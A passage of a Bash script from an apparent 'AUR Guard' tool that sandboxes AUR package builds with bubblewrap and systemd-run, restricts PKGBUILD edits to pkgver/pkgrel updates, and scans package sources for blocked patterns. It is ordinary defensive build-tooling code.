  case "$constraint" in
    '>='*) operator='>='; required="${constraint#>=}" ;;
    '<='*) operator='<='; required="${constraint#<=}" ;;
    '>'*)  operator='>';  required="${constraint#>}" ;;
    '<'*)  operator='<';  required="${constraint#<}" ;;
    '='*)  operator='=';  required="${constraint#=}" ;;
    *) return 1 ;;
  esac

  [[ -n "$required" ]] || return 1
  comparison=$(vercmp "$candidate_version" "$required") || return 1

  case "$operator" in
    '>=') (( comparison >= 0 )) ;;
    '<=') (( comparison <= 0 )) ;;
    '>')  (( comparison > 0 )) ;;
    '<')  (( comparison < 0 )) ;;
    '=')  (( comparison == 0 )) ;;
  esac
}

_aur_guard_find_installed_provider() {
  local dep_name="$1"
  local desc

  for desc in /var/lib/pacman/local/*/desc; do
    [[ -r "$desc" ]] || continue
    awk -v wanted="$dep_name" '
      $0 == "%NAME%" {
        getline
        name = $0
        if (name == wanted) {
          print name
          exit
        }
        next
      }
      $0 == "%PROVIDES%" {
        in_provides = 1
        next
      }
      in_provides && $0 == "" {
        in_provides = 0
        next
      }
      in_provides {
        provided = $0
        sub(/[<>=].*$/, "", provided)
        if (provided == wanted) {
          print name
          exit
        }
      }
    ' "$desc"
  done | LC_ALL=C sort -u | head -n 1
}

_aur_guard_rpc_exact_package() {
  local pkg="$1"
  local json encoded

  _aur_guard_validate_package_name "$pkg" || return 1
  encoded=$(_aur_guard_urlencode "$pkg") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg pkg "$pkg" '
    .results[]
    | select(.Name == $pkg)
    | .Name
  ' "$json"

  local status=$?
  rm -f "$json"
  return "$status"
}

_aur_guard_rpc_providers() {
  local dep_name="$1"
  local json encoded

  type -P jq >/dev/null 2>&1 || return 2
  _aur_guard_validate_package_name "$dep_name" || return 1
  encoded=$(_aur_guard_urlencode "$dep_name") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/search/${encoded}?by=provides" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg dep "$dep_name" '
    .results[]
    | select(
        .Name == $dep
        or ((.Provides // [])
          | map(sub("[<>=].*$"; ""))
          | index($dep))
      )
    | .Name
  ' "$json" | LC_ALL=C sort -u

  local status=${PIPESTATUS[0]}
  rm -f "$json"
  return "$status"
}

_aur_guard_rpc_package_base() {
  local pkg="$1"
  local json encoded

  _aur_guard_validate_package_name "$pkg" || return 1
  encoded=$(_aur_guard_urlencode "$pkg") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -r --arg pkg "$pkg" '
    .results[]
    | select(.Name == $pkg)
    | (.PackageBase // .Name)
  ' "$json"

  local status=$?
  rm -f "$json"
  return "$status"
}

_aur_guard_rpc_package_metadata() {
  local pkg="$1"
  local json encoded

  _aur_guard_validate_package_name "$pkg" || return 1
  encoded=$(_aur_guard_urlencode "$pkg") || return 1
  json=$(mktemp) || return 1

  if ! _aur_guard_download \
      "https://aur.archlinux.org/rpc/v5/info?arg%5B%5D=${encoded}" \
      "$json"; then
    rm -f "$json"
    return 1
  fi

  command jq -er --arg pkg "$pkg" '
    first(.results[] | select(.Name == $pkg)) as $package
    | [
        ($package.PackageBase // $package.Name),
        ($package.Maintainer // "<orphaned>"),
        (($package.LastModified // 0) | tostring)
      ]
    | @tsv
  ' "$json"

  local status=$?
  rm -f "$json"
  return "$status"
}

_aur_guard_prepare_public_keyring() {
  local pkgdir="$1"
  local gnupg_dir="$pkgdir/.awtarchy-gnupg"
  local exported_keys="$pkgdir/.awtarchy-public-keys.gpg"

  rm -rf "$gnupg_dir"
  install -d -m 0700 "$gnupg_dir" || return 1

  if command gpg --batch --export > "$exported_keys" 2>/dev/null \
      && [[ -s "$exported_keys" ]]; then
    if ! GNUPGHOME="$gnupg_dir" command gpg --batch --quiet \
        --import "$exported_keys" >/dev/null 2>&1; then
      rm -f "$exported_keys"
      _aur_guard_fail 'could not create an isolated public-key ring for source verification'
      return 1
    fi
  fi

  rm -f "$exported_keys"
}

_aur_guard_add_ro_path() {
  local array_name="$1"
  local source="$2"
  local destination="$3"
  local -n array_ref="$array_name"

  [[ -e "$source" || -L "$source" ]] || return 0

  if [[ -L "$source" ]]; then
    array_ref+=(--symlink "$(readlink -- "$source")" "$destination")
  elif [[ -d "$source" ]]; then
    array_ref+=(--ro-bind "$source" "$destination")
  else
    array_ref+=(--ro-bind "$source" "$destination")
  fi
}

_aur_guard_run_sandbox_command() {
  local network="$1"
  shift
  local uid gid i
  local -a systemd_args command_line sandbox_command

  sandbox_command=("$@")
  uid=$(id -u) || return 1
  gid=$(id -g) || return 1

  systemd_args=(
    /usr/bin/sudo
    --
    /usr/bin/systemd-run
    --system
    --uid="$uid"
    --gid="$gid"
    --wait
    --pipe
    --collect
    --quiet
    --property=Type=exec
    --property="MemoryMax=$_AUR_GUARD_SANDBOX_MEMORY_MAX"
    --property="MemorySwapMax=$_AUR_GUARD_SANDBOX_MEMORY_SWAP_MAX"
    --property="TasksMax=$_AUR_GUARD_SANDBOX_TASKS_MAX"
    --property="LimitFSIZE=$_AUR_GUARD_SANDBOX_FILE_SIZE_MAX"
    --property=NoNewPrivileges=yes
  )

  case "$network" in
    allow)
      systemd_args+=(
        --property='IPAddressDeny=0.0.0.0/8 10.0.0.0/8 100.64.0.0/10 127.0.0.0/8 169.254.0.0/16 172.16.0.0/12 192.168.0.0/16 224.0.0.0/4 240.0.0.0/4 ::1/128 ::ffff:0:0/96 fc00::/7 fe80::/10 ff00::/8'
      )

      # Public-network sandboxes inherit the transient systemd service network
      # namespace. systemd IPAddressDeny blocks loopback, LAN, link-local,
      # Tailscale CGNAT, multicast, and other non-public ranges. Do not combine
      # bwrap --disable-userns with a later pasta setns() attachment: that nested
      # user-namespace layout can fail with EPERM on otherwise valid systems.
      command_line=()
      for ((i = 0; i < ${#sandbox_command[@]}; i++)); do
        case "${sandbox_command[i]}" in
          --unshare-net)
            ;;
          --block-fd|--json-status-fd)
            ((i++)) || true
            ;;
          *)
            command_line+=("${sandbox_command[i]}")
            ;;
        esac
      done
      ;;
    deny)
      command_line=("${sandbox_command[@]}")
      ;;
    *)
      _aur_guard_fail "invalid sandbox network mode: $network"
      return 2
      ;;
  esac

  command timeout \
    --foreground \
    --kill-after="${_AUR_GUARD_SANDBOX_KILL_AFTER_SECONDS}s" \
    "${_AUR_GUARD_SANDBOX_TIMEOUT_SECONDS}s" \
    "${systemd_args[@]}" "${command_line[@]}"
}

_aur_guard_sandbox_exec() {
  local workdir="$1"
  local network="$2"
  local access="$3"
  local rootfs="$4"
  local username uid gid sandbox_meta resolv_file passwd_file group_file path status
  local gnupg_home cache_home src_dest build_dir pkg_dest srcpkg_dest log_dest
  local -a bwrap_args

  shift 4
  username="${USER:-$(id -un)}"
  uid=$(id -u) || return 1
  gid=$(id -g) || return 1
  rootfs="${rootfs%/}"
  [[ -n "$rootfs" ]] || rootfs='/'

  [[ -d "$workdir" ]] || {
    _aur_guard_fail "sandbox work directory does not exist: $workdir"
    return 1
  }
  [[ -d "$rootfs/usr" ]] || {
    _aur_guard_fail "sandbox root does not contain /usr: $rootfs"
    return 1
  }

  sandbox_meta=$(mktemp -d "${TMPDIR:-/tmp}/awtarchy-sandbox.XXXXXX") || return 1
  resolv_file="$sandbox_meta/resolv.conf"
  passwd_file="$sandbox_meta/passwd"
  group_file="$sandbox_meta/group"

  printf '%s\n' \
    'nameserver 9.9.9.9' \
    'nameserver 149.112.112.112' \
    'options timeout:2 attempts:2' \
    > "$resolv_file" || {
    rm -rf "$sandbox_meta"
    return 1
  }
  printf 'root:x:0:0:root:/root:/bin/bash\n%s:x:%s:%s:AUR Guard:/tmp/awtarchy-home:/bin/bash\n' \
    "$username" "$uid" "$gid" > "$passwd_file"
  printf 'root:x:0:\n%s:x:%s:\n' "$username" "$gid" > "$group_file"
  chmod 0644 "$resolv_file" "$passwd_file" "$group_file"

  bwrap_args=(
    --die-with-parent
    --new-session
    --unshare-user
    --unshare-ipc
    --unshare-pid
    --unshare-uts
    --unshare-cgroup-try
    --disable-userns
    --cap-drop ALL
    --hostname awtarchy-aur-guard
    --proc /proc
    --dev /dev
    --tmpfs /tmp
    --tmpfs /dev/shm
    --tmpfs /run
    --dir /etc
    --dir /var
    --dir /var/lib
    --dir /var/cache
    --dir /opt
    --dir /home
    --dir /root
    --dir /mnt
    --dir /media
    --dir /srv
    --ro-bind "$rootfs/usr" /usr
  )

  case "$network" in
    allow|deny)
      bwrap_args+=(--unshare-net)
      ;;
    *)
      rm -rf "$sandbox_meta"
      _aur_guard_fail "invalid sandbox network mode: $network"
      return 2
      ;;
  esac

  for path in bin sbin lib lib64; do
    _aur_guard_add_ro_path bwrap_args "$rootfs/$path" "/$path"
  done

  for path in \
      makepkg.conf makepkg.conf.d pacman.conf pacman.d paru.conf yay.conf \
      nsswitch.conf hosts host.conf ssl ca-certificates localtime locale.conf \
      locale.gen ld.so.cache ld.so.conf ld.so.conf.d gitconfig; do
    _aur_guard_add_ro_path bwrap_args "$rootfs/etc/$path" "/etc/$path"
  done

  _aur_guard_add_ro_path bwrap_args "$rootfs/var/lib/pacman" /var/lib/pacman
  _aur_guard_add_ro_path bwrap_args "$rootfs/var/cache/pacman/pkg" /var/cache/pacman/pkg
  _aur_guard_add_ro_path bwrap_args "$rootfs/opt" /opt

  bwrap_args+=(
    --ro-bind "$resolv_file" /etc/resolv.conf
    --ro-bind "$passwd_file" /etc/passwd
    --ro-bind "$group_file" /etc/group
  )

  gnupg_home=/work/.awtarchy-gnupg
  cache_home=/work/.awtarchy-cache
  src_dest=/work
  build_dir=/work/.awtarchy-build
  pkg_dest=/work/.awtarchy-pkg
  srcpkg_dest=/work/.awtarchy-srcpkg
  log_dest=/work/.awtarchy-log

  case "$access" in
    readonly)
      bwrap_args+=(
        --ro-bind "$workdir" /work
        --dir /tmp/awtarchy-gnupg
        --dir /tmp/awtarchy-cache
        --dir /tmp/awtarchy-src
        --dir /tmp/awtarchy-build
        --dir /tmp/awtarchy-pkg
        --dir /tmp/awtarchy-srcpkg
        --dir /tmp/awtarchy-log
      )
      gnupg_home=/tmp/awtarchy-gnupg
      cache_home=/tmp/awtarchy-cache
      src_dest=/tmp/awtarchy-src
      build_dir=/tmp/awtarchy-build
      pkg_dest=/tmp/awtarchy-pkg
      srcpkg_dest=/tmp/awtarchy-srcpkg
      log_dest=/tmp/awtarchy-log
      ;;
    writable)
      bwrap_args+=(--bind "$workdir" /work)
      if [[ -d "$workdir/.git" ]]; then
        bwrap_args+=(--ro-bind "$workdir/.git" /work/.git)
      fi
      ;;
    *)
      rm -rf "$sandbox_meta"
      _aur_guard_fail "invalid sandbox filesystem mode: $access"
      return 2
      ;;
  esac

  if [[ $network == allow ]]; then
    bwrap_args+=(--block-fd 8 --json-status-fd 9)
  fi

  if [[ $network == deny ]]; then
    bwrap_args+=(--setenv pnpm_config_offline true)
  fi

  bwrap_args+=(
    --dir /tmp/awtarchy-home
    --clearenv
    --setenv HOME /tmp/awtarchy-home
    --setenv USER "$username"
    --setenv LOGNAME "$username"
    --setenv SHELL /bin/bash
    --setenv PATH /usr/local/sbin:/usr/local/bin:/usr/bin
    --setenv LANG C.UTF-8
    --setenv LC_ALL C.UTF-8
    --setenv TMPDIR /tmp
    --setenv FAKEROOTDONTTRYCHOWN 1
    --setenv GNUPGHOME "$gnupg_home"
    --setenv XDG_CACHE_HOME "$cache_home"
    --setenv XDG_DATA_HOME "$cache_home/xdg-data"
    --setenv XDG_CONFIG_HOME "$cache_home/xdg-config"
    --setenv XDG_STATE_HOME "$cache_home/xdg-state"
    --setenv PNPM_HOME "$cache_home/pnpm-home"
    --setenv pnpm_config_store_dir "$cache_home/pnpm-store"
    --setenv pnpm_config_cache_dir "$cache_home/pnpm-cache"
    --setenv CARGO_HOME "$cache_home/cargo"
    --setenv GOCACHE "$cache_home/go-build"
    --setenv GOMODCACHE "$cache_home/go-mod"
    --setenv npm_config_cache "$cache_home/npm"
    --setenv BUN_INSTALL_CACHE_DIR "$cache_home/bun"
    --setenv YARN_CACHE_FOLDER "$cache_home/yarn"
    --setenv CCACHE_DIR "$cache_home/ccache"
    --setenv SRCDEST "$src_dest"
    --setenv BUILDDIR "$build_dir"
    --setenv PKGDEST "$pkg_dest"
    --setenv SRCPKGDEST "$srcpkg_dest"
    --setenv LOGDEST "$log_dest"
    --chdir /work
    "$@"
  )

  _aur_guard_run_sandbox_command "$network" /usr/bin/bwrap "${bwrap_args[@]}"
  status=$?
  rm -rf "$sandbox_meta"
  return "$status"
}

_aur_guard_prefetch_pnpm_dependencies() {
  local pkgbase="$1"
  local pkgdir="$2"
  local rootfs="${_AUR_GUARD_SANDBOX_ROOTFS:-/}"
  local build_root="$pkgdir/.awtarchy-build"
  local pkgdir_real build_root_real lockfile project_dir project_real relative
  local -a lockfiles=()

  [[ -d "$build_root" ]] || return 0
  pkgdir_real=$(/usr/bin/realpath -e -- "$pkgdir") || return 1
  build_root_real=$(/usr/bin/realpath -e -- "$build_root") || return 1

  mapfile -d '' lockfiles < <(
    find -P "$build_root" -type f -name pnpm-lock.yaml -print0
  )
  (( ${#lockfiles[@]} > 0 )) || return 0

  for lockfile in "${lockfiles[@]}"; do
    project_dir=${lockfile%/*}
    project_real=$(/usr/bin/realpath -e -- "$project_dir") || return 1

    case "$project_real" in
      "$build_root_real"|"$build_root_real"/*)
        ;;
      *)
        _aur_guard_fail "$pkgbase pnpm project path escapes its extracted source tree: $project_dir"
        return 1
        ;;
    esac

    case "$project_real" in
      "$pkgdir_real"/*)
        relative=${project_real#"$pkgdir_real"/}
        ;;
      *)
        _aur_guard_fail "$pkgbase pnpm project path is outside its sandbox work directory: $project_dir"
        return 1
        ;;
    esac
    printf 'AUR Guard: prefetching locked pnpm dependencies for %s with lifecycle scripts disabled.\n' \
      "$pkgbase"

    # shellcheck disable=SC2016
    if ! _aur_guard_sandbox_exec \
        "$pkgdir" allow writable "$rootfs" \
        /usr/bin/bash -c '
          set -euo pipefail
          cd -- "$1"
          export pnpm_config_ignore_scripts=true
          exec /usr/bin/pnpm fetch --frozen-lockfile
        ' bash "/work/$relative"; then
      _aur_guard_fail "$pkgbase failed to prefetch its locked pnpm dependency store"
      return 1
    fi
  done
}

_aur_guard_makepkg_sandbox() {
  local pkgdir="$1"
  local network="$2"
  local access="$3"
  local rootfs="${_AUR_GUARD_SANDBOX_ROOTFS:-/}"

  shift 3

  mkdir -p \
    "$pkgdir/.awtarchy-gnupg" \
    "$pkgdir/.awtarchy-build" \
    "$pkgdir/.awtarchy-pkg" \
    "$pkgdir/.awtarchy-srcpkg" \
    "$pkgdir/.awtarchy-log" \
    "$pkgdir/.awtarchy-cache" || return 1

  _aur_guard_sandbox_exec \
    "$pkgdir" "$network" "$access" "$rootfs" \
    /usr/bin/makepkg "$@"
}

_aur_guard_assert_tracked_files_unchanged() {
  local pkg="$1"
  local pkgdir="$2"

  if ! command git -C "$pkgdir" diff --quiet -- . \
      || ! command git -C "$pkgdir" diff --cached --quiet -- .; then
    command git -C "$pkgdir" diff -- . >&2 || true
    _aur_guard_fail "$pkg modified tracked AUR files while makepkg metadata or sources were being inspected"
    return 1
  fi
}


_aur_guard_has_recorded_git_snapshot() {
  local pkgbase="$1"

  [[ -n "${_AUR_GUARD_VCS_SNAPSHOTS:-}" && -f "$_AUR_GUARD_VCS_SNAPSHOTS" ]] || return 1
  awk -F '\t' -v pkgbase="$pkgbase" '$1 == pkgbase { found=1; exit } END { exit !found }' \
    "$_AUR_GUARD_VCS_SNAPSHOTS"
}

_aur_guard_prepare_pkgbuild_mutation_state() {
  local pkgbase="$1"
  local pkgdir="$2"
  local state_dir="$pkgdir/.awtarchy-pkgbuild-state"

  [[ -f "$pkgdir/PKGBUILD" ]] || {
    _aur_guard_fail "$pkgbase has no PKGBUILD before source preparation"
    return 1
  }

  rm -rf -- "$state_dir"
  mkdir -p -- "$state_dir" || return 1
  cp -a -- "$pkgdir/PKGBUILD" "$state_dir/original"
}

_aur_guard_accept_prepared_pkgver_update() {
  local pkgbase="$1"
  local pkgdir="$2"
  local state_dir="$pkgdir/.awtarchy-pkgbuild-state"
  local diff_file="$state_dir/pkgbuild.diff"
  local numstat
  local additions=0 deletions=0 other_changes=0
  local pkgver_additions=0 pkgver_deletions=0
  local pkgrel_additions=0 pkgrel_deletions=0
  local -a changed_files=()
  local added_pkgver_assignment='' added_pkgrel_assignment=''
  local pkgver_value='' pkgrel_value='' accepted_detail='pkgver update'

  [[ -f "$state_dir/original" ]] || {
    _aur_guard_fail "$pkgbase has no saved pre-preparation PKGBUILD state"
    return 1
  }

  if ! command git -C "$pkgdir" diff --cached --quiet -- .; then
    command git -C "$pkgdir" diff --cached -- . >&2 || true
    _aur_guard_fail "$pkgbase staged tracked AUR-file changes during source preparation"
    return 1
  fi

  mapfile -t changed_files < <(
    command git -C "$pkgdir" diff --name-only -- . | LC_ALL=C sort -u
  )

  if (( ${#changed_files[@]} == 0 )); then
    cp -a -- "$pkgdir/PKGBUILD" "$state_dir/prepared"
    return 0
  fi

  if (( ${#changed_files[@]} != 1 )) || [[ "${changed_files[0]}" != PKGBUILD ]]; then
    command git -C "$pkgdir" diff -- . >&2 || true
    _aur_guard_fail "$pkgbase modified tracked AUR files other than PKGBUILD during source preparation"
    return 1
  fi

  _aur_guard_has_recorded_git_snapshot "$pkgbase" || {
    command git -C "$pkgdir" diff -- PKGBUILD >&2 || true
    _aur_guard_fail "$pkgbase changed PKGBUILD without a recorded Git source snapshot"
    return 1
  }

  grep -Eq '^[[:space:]]*(function[[:space:]]+)?pkgver[[:space:]]*(\(\))?[[:space:]]*\{' \
      "$state_dir/original" || {
    command git -C "$pkgdir" diff -- PKGBUILD >&2 || true
    _aur_guard_fail "$pkgbase changed PKGBUILD but does not define pkgver()"
    return 1
  }

  numstat=$(command git -C "$pkgdir" diff --numstat -- PKGBUILD)
  case "$numstat" in
    $'1\t1\tPKGBUILD'|$'2\t2\tPKGBUILD')
      ;;
    *)
      command git -C "$pkgdir" diff -- PKGBUILD >&2 || true
      _aur_guard_fail "$pkgbase changed more than the allowed pkgver/pkgrel lines while resolving its VCS version"
      return 1
      ;;
  esac

  command git -C "$pkgdir" diff --unified=0 -- PKGBUILD > "$diff_file"

  while IFS= read -r line; do
    case "$line" in
      '--- '*|'+++ '*|'@@ '*|'diff --git '*|'index '*)
        ;;
      -*)
        ((deletions++)) || true
        if [[ "${line#-}" =~ ^[[:space:]]*pkgver[[:space:]]*= ]]; then
          ((pkgver_deletions++)) || true
        elif [[ "${line#-}" =~ ^[[:space:]]*pkgrel[[:space:]]*= ]]; then
          ((pkgrel_deletions++)) || true
        else
          ((other_changes++)) || true
        fi
        ;;
      +*)
        ((additions++)) || true
        if [[ "${line#+}" =~ ^[[:space:]]*pkgver[[:space:]]*= ]]; then
          ((pkgver_additions++)) || true
          added_pkgver_assignment="${line#+}"
        elif [[ "${line#+}" =~ ^[[:space:]]*pkgrel[[:space:]]*= ]]; then
          ((pkgrel_additions++)) || true
          added_pkgrel_assignment="${line#+}"
        else
          ((other_changes++)) || true
        fi
        ;;
    esac
  done < "$diff_file"

  if (( pkgver_additions != 1 || pkgver_deletions != 1 ||
        pkgrel_additions != pkgrel_deletions || pkgrel_additions > 1 ||
        additions != deletions || other_changes != 0 )); then
    cat "$diff_file" >&2
    _aur_guard_fail "$pkgbase made a PKGBUILD change other than pkgver and an optional pkgrel reset"
    return 1
  fi

  pkgver_value=${added_pkgver_assignment#*=}
  pkgver_value="${pkgver_value#"${pkgver_value%%[![:space:]]*}"}"
  pkgver_value="${pkgver_value%"${pkgver_value##*[![:space:]]}"}"
  if [[ "$pkgver_value" == \"*\" || "$pkgver_value" == \'*\' ]]; then
    pkgver_value=${pkgver_value:1:${#pkgver_value}-2}
  fi
  if [[ -z "$pkgver_value" || ! "$pkgver_value" =~ ^[0-9A-Za-z._+]+$ ]]; then
    cat "$diff_file" >&2
    _aur_guard_fail "$pkgbase produced an unsafe or invalid static pkgver assignment"
    return 1
  fi

  if (( pkgrel_additions == 1 )); then
    pkgrel_value=${added_pkgrel_assignment#*=}
    pkgrel_value="${pkgrel_value#"${pkgrel_value%%[![:space:]]*}"}"
    pkgrel_value="${pkgrel_value%"${pkgrel_value##*[![:space:]]}"}"
    if [[ "$pkgrel_value" == \"*\" || "$pkgrel_value" == \'*\' ]]; then
      pkgrel_value=${pkgrel_value:1:${#pkgrel_value}-2}
    fi
    if [[ "$pkgrel_value" != 1 ]]; then
      cat "$diff_file" >&2
      _aur_guard_fail "$pkgbase changed pkgrel to a value other than makepkg's deterministic reset to 1"
      return 1
    fi
    accepted_detail='pkgver update and pkgrel reset to 1'
  fi

  cp -a -- "$pkgdir/PKGBUILD" "$state_dir/prepared"
  printf 'AUR Guard: accepted deterministic %s for %s after pinning its Git source snapshot.\n' \
    "$accepted_detail" "$pkgbase"
}

_aur_guard_assert_prepared_pkgbuild_state() {
  local pkgbase="$1"
  local pkgdir="$2"
  local state_dir="$pkgdir/.awtarchy-pkgbuild-state"
  local -a changed_files=()

  [[ -f "$state_dir/prepared" ]] || {
    _aur_guard_fail "$pkgbase has no saved prepared PKGBUILD state"
    return 1
  }

  if ! command git -C "$pkgdir" diff --cached --quiet -- .; then
    command git -C "$pkgdir" diff --cached -- . >&2 || true
    _aur_guard_fail "$pkgbase staged tracked AUR-file changes during the build"
    return 1
  fi

  mapfile -t changed_files < <(
    command git -C "$pkgdir" diff --name-only -- . | LC_ALL=C sort -u
  )

  case "${#changed_files[@]}" in
    0)
      cmp -s "$pkgdir/PKGBUILD" "$state_dir/prepared" || {
        _aur_guard_fail "$pkgbase PKGBUILD no longer matches its prepared state"
        return 1
      }
      ;;
    1)
      if [[ "${changed_files[0]}" != PKGBUILD ]] \
          || ! cmp -s "$pkgdir/PKGBUILD" "$state_dir/prepared"; then
        command git -C "$pkgdir" diff -- . >&2 || true
        _aur_guard_fail "$pkgbase changed tracked AUR files after source preparation"
        return 1
      fi
      ;;
    *)
      command git -C "$pkgdir" diff -- . >&2 || true
      _aur_guard_fail "$pkgbase changed tracked AUR files after source preparation"
      return 1
      ;;
  esac
}

_aur_guard_restore_original_pkgbuild() {
  local pkgbase="$1"
  local pkgdir="$2"
  local state_dir="$pkgdir/.awtarchy-pkgbuild-state"

  [[ -f "$state_dir/original" ]] || {
    _aur_guard_fail "$pkgbase has no original PKGBUILD state to restore"
    return 1
  }

  cp -a -- "$state_dir/original" "$pkgdir/PKGBUILD"
  _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir"
}


_aur_guard_source_candidate() {
  local file="$1"
  local relative="$2"
  local name="${relative##*/}"

  case "$name" in
    PKGBUILD|*.sh|*.bash|*.zsh|*.fish|*.py|*.pyw|*.pl|*.rb|*.js|*.jsx|*.mjs|*.cjs|*.ts|*.tsx|*.lua|*.tcl|*.awk|*.inc|*.env|*.conf|*.cfg|*.rc|*.profile|*.mk|*.in|*.patch|*.diff|*.c|*.cc|*.cpp|*.cxx|*.h|*.hh|*.hpp|*.go|*.rs|*.java|*.kt|*.kts|*.scala|*.php|*.ps1|*.service|*.timer|*.socket|*.path|*.desktop|*.hook|*.install|*.cmake|CMakeLists.txt|meson.build|meson_options.txt|Makefile|GNUmakefile|makefile|configure|configure.ac|bootstrap|install|setup|build|run|package.json|package-lock.json|npm-shrinkwrap.json|pnpm-lock.yaml|yarn.lock|bun.lock|bun.lockb|pyproject.toml|requirements.txt|Cargo.toml|Cargo.lock|go.mod|go.sum)
      return 0
      ;;
  esac

  [[ -x "$file" ]] && return 0
  [[ $(head -c 2 "$file" 2>/dev/null) == '#!' ]]
}

_aur_guard_find_pkgbuild_for_root() {
  local current

  current=$(/usr/bin/realpath -m -- "$1") || return 1
  while [[ "$current" != / ]]; do
    if [[ -f "$current/PKGBUILD" && ! -L "$current/PKGBUILD" ]]; then
      printf '%s\n' "$current/PKGBUILD"
      return 0
    fi
    current=${current%/*}
    [[ -n "$current" ]] || current=/
  done

  return 1
}

_aur_guard_unreferenced_development_metadata() {
  local pkgbuild="$1"
  local relative="$2"
  local marker name

  [[ -f "$pkgbuild" && ! -L "$pkgbuild" ]] || return 1

  case "$relative" in
    .devcontainer/*|*/.devcontainer/*)
      marker='.devcontainer'
      ;;
    .github/*|*/.github/*)
      marker='.github'
      ;;
    *)
      return 1
      ;;
  esac

  name=${relative##*/}
  if /usr/bin/grep -Fq -- "$relative" "$pkgbuild" \
      || /usr/bin/grep -Fq -- "$name" "$pkgbuild" \
      || /usr/bin/grep -Fq -- "$marker" "$pkgbuild"; then
    return 1
  fi

  return 0
}

_aur_guard_file_is_text_scannable() {
  local file="$1"
  local mime

  mime=$(/usr/bin/file -Lb --mime-type -- "$file" 2>/dev/null) || return 1
  case "$mime" in
    text/*|inode/x-empty|application/json|application/ld+json|application/javascript|application/x-javascript|application/xml|application/*+xml|application/x-shellscript)
      return 0
      ;;
  esac

  return 1
}

_aur_guard_file_hard_block_matches() {
  local file="$1"
  local pattern="$2"
  local relative="${3:-${file##*/}}"
  local line
  local line_number=0
  local matched=false

  if [[ ${relative##*/} != PKGBUILD ]]; then
    /usr/bin/grep --binary-files=without-match -HnEi "$pattern" "$file"
    return $?
  fi

  # Maintainer and Contributor lines are inert PKGBUILD comments. Some old AUR
  # packages obfuscate email addresses in those comments to reduce scraping.
  # Ignore only the complete comment line; executable PKGBUILD content remains
  # subject to the normal hard-block patterns.
  while IFS= read -r line || [[ -n "$line" ]]; do
    ((line_number += 1))

    if [[ "$line" =~ ^[[:space:]]*#[[:space:]]*(Maintainer|Contributor): ]]; then
      continue
    fi

    if /usr/bin/grep -Eqi "$pattern" <<< "$line"; then
      printf '%s:%d:%s\n' "$file" "$line_number" "$line"
      matched=true
    fi
  done < "$file"

  $matched
}

_aur_guard_scan_source_tree() {
  local pkg="$1"
  local root="$2"
  local mode="${3:-recursive}"
  local file relative size pkgbuild hard_block_matches
  local scanned=0
  local source_scanned=0
  local dependency_scanned=0
  local dependency_candidate=false
  local opaque_binary_files=0
  local network_reference_files=0
  local matched=false
  local -a find_args

  [[ -d "$root" ]] || return 0

  local tree_bytes
  tree_bytes=$(du -sb --apparent-size "$root" 2>/dev/null | awk '{print $1}') || {
    _aur_guard_fail "could not determine total source-tree size for $pkg"
    return 1
  }
  if (( tree_bytes > _AUR_GUARD_TREE_MAX_BYTES )); then
    _aur_guard_fail "$pkg exceeds the total source-tree size limit"
    return 1
  fi

  find_args=("$root")
  if [[ "$mode" == 'top' ]]; then
    find_args+=(-maxdepth 1)
  fi
  find_args+=(
    -type f
    ! -path '*/.git/*'
    ! -path '*/.awtarchy-gnupg/*'
  )

  if [[ ${root%/} != */.awtarchy-cache ]]; then
    find_args+=(! -path '*/.awtarchy-cache/*')
  fi

  find_args+=(
    ! -path '*/.awtarchy-pkg/*'
    ! -path '*/.awtarchy-srcpkg/*'
    ! -path '*/.awtarchy-log/*'
    -print0
  )

  pkgbuild=$(_aur_guard_find_pkgbuild_for_root "$root" 2>/dev/null || true)

  while IFS= read -r -d '' file; do
    relative="${file#"$root"/}"
    _aur_guard_source_candidate "$file" "$relative" || continue

    if ! _aur_guard_file_is_text_scannable "$file"; then
      ((opaque_binary_files += 1))
      _aur_guard_note_context_warning \
        "$pkg:binary:$relative" \
        "$relative is an opaque binary or non-text file and cannot be inspected with text-pattern scanning; strong source integrity and final artifact checks still apply"
      continue
    fi

    dependency_candidate=false
    if [[ ${root%/} == */.awtarchy-cache ]] \
        || [[ "$relative" == node_modules/* ]] \
        || [[ "$relative" == */node_modules/* ]]; then
      dependency_candidate=true
    fi

    ((scanned += 1))
    if (( scanned % _AUR_GUARD_PROGRESS_FILE_INTERVAL == 0 )); then
      printf 'AUR Verify: scanned %d script/build candidates for %s so far.\n' \
        "$scanned" "$pkg" >&2
    fi

    if $dependency_candidate; then
      ((dependency_scanned += 1))
      if (( dependency_scanned > _AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES )); then
        _aur_guard_fail "$pkg contains more than $_AUR_GUARD_DEPENDENCY_SCAN_MAX_FILES dependency-cache script or build files; refusing an incomplete dependency scan"
        return 1
      fi
    else
      ((source_scanned += 1))
      if (( source_scanned > _AUR_GUARD_SOURCE_SCAN_MAX_FILES )); then
        _aur_guard_fail "$pkg contains more than $_AUR_GUARD_SOURCE_SCAN_MAX_FILES source script or build files; refusing an incomplete source scan"
        return 1
      fi
    fi

    size=$(stat -c %s "$file" 2>/dev/null) || {
      _aur_guard_fail "could not determine source-file size: $relative"
      return 1
    }

    if (( size > _AUR_GUARD_SOURCE_SCAN_MAX_BYTES )); then
      _aur_guard_fail "$pkg contains a script-like source file larger than the scan limit: $relative"
      return 1
    fi

    hard_block_matches=$(_aur_guard_file_hard_block_matches \
      "$file" "$_AUR_GUARD_SOURCE_HARD_BLOCK_RE" "$relative" || true)
    if [[ -n "$hard_block_matches" ]]; then
      if [[ -n "$pkgbuild" ]] \
          && _aur_guard_unreferenced_development_metadata "$pkgbuild" "$relative"; then
        _aur_guard_note_context_warning \
          "$pkg:development-metadata:$relative" \
          "$relative contains a normally blocked execution pattern inside unreferenced development metadata; the offline build and final artifact scan must confirm it is unused"
      else
        printf '%s\n' "$hard_block_matches"
        matched=true
      fi
    fi

    if /usr/bin/grep -Eq 'https?://|git(\+https)?://|ssh://' "$file"; then
      ((network_reference_files += 1))
    fi

